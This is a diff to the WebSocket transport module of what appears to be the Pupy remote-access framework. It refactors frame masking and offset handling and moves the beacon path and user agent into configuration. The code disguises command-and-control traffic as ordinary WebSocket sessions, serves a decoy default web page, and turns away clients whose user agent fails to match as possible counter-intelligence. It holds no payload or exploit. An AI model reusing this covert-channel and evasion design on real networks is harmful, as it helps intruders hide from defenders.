@@ -8,9 +8,7 @@
 """
 
 __all__ = (
-    'InvalidHTTPReq', 'MalformedData', 'MissingData',
-    'paths', 'UA',
-    'PupyWebSocketTransport',
+    'InvalidHTTPReq', 'PupyWebSocketTransport',
     'PupyWebSocketClient', 'PupyWebSocketServer'
 )
 
@@ -31,20 +29,6 @@ logger = getLogger('ws')
 
 class InvalidHTTPReq(Exception):
     __slots__ = ()
-
-class MalformedData(Exception):
-    __slots__ = ()
-
-class ShortRead(Exception):
-    __slots__ = ()
-
-# IOCs: These should change per engagement.
-paths = [
-    "/wsapp"
-]
-
-# Also update conf.py in network/transports/websocket/
-UA = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
 
 error_response_body="""<html><body><h1>It works!</h1>
 <p>This is the default web page for this server.</p>
@@ -77,9 +61,9 @@ OPCODE_PONG         = 0xA
 class XOR(object):
     __slots__ = ('offset', 'key')
 
-    def __init__(self, key):
+    def __init__(self, key, offset=0):
         self.key = key
-        self.offset = 0
+        self.offset = offset
 
     def strxor(self, data):
         ldata = len(data)
@@ -118,26 +102,32 @@ def add_ws_encapsulation(data, output, mask=None, opcode=OPCODE_BINARY):
 
     output.write(header, notify=False)
     data.write_to(output, modificator=modificator)
-def remove_ws_encapsulation(data, output, buf, remainder, mask=None):
+
+def remove_ws_encapsulation(data, output, buf, offset, remainder, mask=None):
     if remainder:
 
         encoder = None
+        modificator = None
         if mask:
-            encoder = XOR(mask).strxor
+            encoder = XOR(mask, offset)
+            modificator = encoder.strxor
 
-        _, total_write = data.write_to(buf, n=remainder, modificator=encoder)
+        _, total_write = data.write_to(
+            buf, n=remainder, modificator=modificator)
 
         remainder -= total_write
         if not remainder:
             _, msg_len = buf.write_to(output)
-            return msg_len, remainder, mask
+            return msg_len, encoder.offset if encoder else 0, remainder, mask
         else:
-            return 0, remainder, mask
+            return 0, encoder.offset if encoder else 0, remainder, mask
 
     if len(data) < 2:
         # Header too short
-        logger.debug('Short read / 1: %d', len(data))
-        return 0, remainder, mask
+        if __debug__:
+            logger.debug('Short read / 1: %d', len(data))
+
+        return 0, offset, remainder, mask
 
     b1, b2 = struct.unpack('BB', data.peek(2))
     opcode = b1 & OPCODE
@@ -145,7 +135,8 @@ def remove_ws_encapsulation(data, output, buf, remainder, mask=None):
     payload_len = b2 & PAYLOAD_LEN
     mask_len = MASK_LEN if masked else 0
 
-    logger.debug('b1=%02x b2=%02x len=%d', b1, b2, payload_len)
+    if __debug__:
+        logger.debug('b1=%02x b2=%02x len=%d', b1, b2, payload_len)
 
     if not b1:
         raise EOFError('Client closed connection')
@@ -163,40 +154,45 @@ def remove_ws_encapsulation(data, output, buf, remainder, mask=None):
     if payload_len == PAYLOAD_LEN_EXT16:
         if len(data) < 2 + 2 + mask_len:
             # Header too short
-            logger.debug('Header too short: %d < %d', len(data), 2 + 2 + mask_len)
-            return 0, remainder, bool(mask_len)
+            if __debug__:
+                logger.debug('Header too short: %d < %d', len(data), 2 + 2 + mask_len)
+            return 0, offset, remainder, bool(mask_len)
 
         _, _, payload_len = struct.unpack('>BBH', data.read(4))
 
     elif payload_len == PAYLOAD_LEN_EXT64:
         if len(data) < 2 + 8 + mask_len:
             # Header too short
-            logger.debug('Header too short: %d < %d', len(data), 2 + 8 + mask_len)
-            return 0, remainder, bool(mask_len)
+            if __debug__:
+                logger.debug('Header too short: %d < %d', len(data), 2 + 8 + mask_len)
+            return 0, offset, remainder, bool(mask_len)
 
         _, _, payload_len = struct.unpack('>BBQ', data.read(10))
     else:
         if len(data) < 2 + mask_len:
-            logger.debug('Header too short: %d < %d', len(data), 2 + mask_len)
-            return 0, remainder, bool(mask_len)
+            if __debug__:
+                logger.debug('Header too short: %d < %d', len(data), 2 + mask_len)
+            return 0, offset, remainder, bool(mask_len)
 
         # payload_len is b2, drain b1, b2
         data.drain(2)
 
     encoder = None
+    modificator = None
     if mask_len:
         mask = data.read(mask_len)
-        encoder = XOR(mask).strxor
+        encoder = XOR(mask)
+        modificator = encoder.strxor
 
     if len(data) >= payload_len:
         _, msg_len = data.write_to(
-            output, modificator=encoder, n=payload_len)
+            output, modificator=modificator, n=payload_len)
 
-        return msg_len, remainder, mask
+        return msg_len, encoder.offset if encoder else 0, remainder, mask
 
-    _, written = data.write_to(buf, modificator=encoder)
+    _, written = data.write_to(buf, modificator=modificator)
     remainder = payload_len - written
-    return 0, remainder, mask
+    return 0, encoder.offset if encoder else 0, remainder, mask
 
 class PupyWebSocketTransport(BasePupyTransport):
     """
@@ -205,27 +201,30 @@ class PupyWebSocketTransport(BasePupyTransport):
     __slots__ = ()
 
 class PupyWebSocketClient(PupyWebSocketTransport):
-    client = True
-    path = random.choice(paths)
     socketkey = ''.join(random.sample(string.printable,16))
-    mask = ''.join(random.sample(string.printable, MASK_LEN))
-    user_agent = UA
-    host = "www.example.com"
-    upgraded = False
 
     __slots__ = (
-        'path', 'user_agent', 'socketkey',
-        'missing_bytes', 'decoded'
+        'host', 'path', 'user_agent', 'socketkey', 'offset',
+        'missing_bytes', 'decoded', 'upgraded', 'mask'
     )
 
     def __init__(self, *args, **kwargs):
         PupyWebSocketTransport.__init__(self, *args, **kwargs)
 
+        self.upgraded = False
         self.missing_bytes = 0
+        self.offset = 0
         self.decoded = Buffer()
+        self.user_agent = kwargs.get('user-agent')
+        self.path = kwargs.get('path')
         self.host = kwargs.get(
             'host',
             'www.' + ''.join(random.sample(string.printable,16)) + '.net')
+
+        if __debug__:
+            logger.debug(
+                'WS Client, path=%s, user-agent=%s host=%s',
+                self.path, self.user_agent, self.host)
 
     def on_connect(self):
         payload = "%s %s HTTP/1.1\r\n" % ('GET', self.path)
@@ -249,7 +248,8 @@ class PupyWebSocketClient(PupyWebSocketTransport):
         """
 
         try:
-            add_ws_encapsulation(data, self.downstream, self.mask)
+            mask = ''.join(random.sample(string.printable, MASK_LEN))
+            add_ws_encapsulation(data, self.downstream, mask)
 
         except Exception, e:
             raise EOFError(str(e))
@@ -265,29 +265,37 @@ class PupyWebSocketClient(PupyWebSocketTransport):
                 d = data.peek(len(UPGRADE_101_SUCCESS))
                 if len(d) < len(UPGRADE_101_SUCCESS):
                     # Short answer
-                    logger.debug('Short answer (%s)', repr(d))
+                    if __debug__:
+                        logger.debug('Short answer (%s)', repr(d))
                     return
                 elif d.startswith('HTTP/') and not d.startswith(UPGRADE_101_SUCCESS):
                     raise EOFError('Invalid response: {}'.format(repr(d)))
 
                 d = data.peek()
                 if '\r\n\r\n' not in d:
-                    logger.debug('Incomplete header')
+                    if __debug__:
+                        logger.debug('Incomplete header')
                     return
 
                 EOFP = d.index('\r\n\r\n')
                 data.drain(EOFP + 4)
-                logger.debug('Connection upgraded')
+                if __debug__:
+                    logger.debug('Connection upgraded')
 
                 self.upgraded = True
 
-            logger.debug('Parse ws messages')
+            if __debug__:
+                logger.debug('Parse ws messages')
+
             while data:
-                msg_len, self.missing_bytes, _ = remove_ws_encapsulation(
-                    data, self.upstream, self.decoded, self.missing_bytes
+                msg_len, self.offset, self.missing_bytes, _ = remove_ws_encapsulation(
+                    data, self.upstream, self.decoded, self.offset, self.missing_bytes
                 )
 
-                logger.debug('Parsed: %d, missing: %d, left: %d', msg_len, self.missing_bytes, len(data))
+                if __debug__:
+                    logger.debug(
+                        'Parsed: %d, offset: %d, missing: %d, left: %d',
+                        msg_len, self.offset, self.missing_bytes, len(data))
 
                 if not msg_len:
                     break
@@ -297,21 +305,25 @@ class PupyWebSocketClient(PupyWebSocketTransport):
 
 
 class PupyWebSocketServer(PupyWebSocketTransport):
-    client = False
-    verify_user_agent = UA # set to the user agent to verify or None not to verify
-    missing_bytes = 0
-    decoded_len = 0
-    mask = ''
-
     __slots__ = (
-        'verify_user_agent', 'missing_bytes', 'upgraded', 'decoded', 'mask'
+        'user_agent', 'path', 'offset',
+        'missing_bytes', 'upgraded', 'decoded', 'mask',
     )
 
     def __init__(self, *args, **kwargs):
         PupyWebSocketTransport.__init__(self, *args, **kwargs)
         self.upgraded = False
+        self.user_agent = kwargs.pop('user-agent')
+        self.path = kwargs.pop('path')
         self.mask = True
+        self.offset = 0
+        self.missing_bytes = 0
         self.decoded = Buffer()
+
+        if __debug__:
+            logger.debug(
+                'WS Server, path=%s, user-agent=%s',
+                self.path, self.user_agent)
 
     def calculate_response_key(self, key):
         GUID = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11'
@@ -320,7 +332,9 @@ class PupyWebSocketServer(PupyWebSocketTransport):
         return response_key.decode('ASCII')
 
     def bad_request(self, msg):
-        logger.debug(msg)
+        if __debug__:
+            logger.debug(msg)
+
         self.downstream.write(error_response)
         self.close(0)
 
@@ -348,12 +362,13 @@ class PupyWebSocketServer(PupyWebSocketTransport):
                 self.bad_request('Invalid HTTP method or data (%s)', repr(d))
 
             if '\r\n\r\n' not in d:
-                logger.debug('Short read, incomplete header')
+                if __debug__:
+                    logger.debug('Short read, incomplete header')
                 return
 
             _, path, _ = d.split(' ', 2)
-            if path not in paths:
-                self.bad_request('Path does not match ({})!'.format(path))
+            if path != self.path:
+                self.bad_request('Path does not match ({} != {})!'.format(path, self.path))
                 return
 
             key = re.search('\n[sS]ec-[wW]eb[sS]ocket-[kK]ey[\s]*:[\s]*(.*)\r\n', d)
@@ -363,7 +378,7 @@ class PupyWebSocketServer(PupyWebSocketTransport):
                 self.bad_request('Unable to get WebSocketKey')
                 return
 
-            if self.verify_user_agent:
+            if self.user_agent:
                 ua = re.search('\n[uU]ser-[aA]gent:[\s]*(.*)\r\n', d)
                 if ua:
                     ua = ua.group(1)
@@ -371,8 +386,10 @@ class PupyWebSocketServer(PupyWebSocketTransport):
                     self.bad_request('No User-Agent provided')
                     return
 
-                if ua != self.verify_user_agent:
-                    self.bad_request('Bad User-Agent provided. May be counter-intel')
+                if ua != self.user_agent:
+                    self.bad_request(
+                        'Bad User-Agent provided. May be counter-intel ({} != {})'.format(
+                            ua, self.user_agent))
                     return
 
             payload = 'HTTP/1.1 101 Switching Protocols\r\n'
@@ -387,11 +404,14 @@ class PupyWebSocketServer(PupyWebSocketTransport):
             data.drain(d.index('\r\n\r\n') + 4)
 
         while data:
-            msg_len, self.missing_bytes, self.mask = remove_ws_encapsulation(
+            msg_len, self.offset, self.missing_bytes, self.mask = remove_ws_encapsulation(
                 data, self.upstream, self.decoded,
-                self.missing_bytes, self.mask)
+                self.offset, self.missing_bytes, self.mask)
 
-            logger.debug('Parsed: %d, missing: %d, left: %d', msg_len, self.missing_bytes, len(data))
+            if __debug__:
+                logger.debug(
+                    'Parsed: %d, offset: %d, missing: %d, left: %d',
+                    msg_len, self.offset, self.missing_bytes, len(data))
 
             if not msg_len:
                 break
